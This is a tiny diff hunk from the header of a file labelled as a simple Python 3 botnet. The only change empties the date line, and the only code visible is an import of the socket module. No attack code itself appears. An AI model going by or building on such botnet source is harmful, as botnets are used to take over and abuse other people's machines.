@@ -1,6 +1,6 @@
 # PYbot - A simple Python3 botnet
 # Author: random
-# Date: 27/09/2019
+# Date: 
 # Bot
 
 import socket 
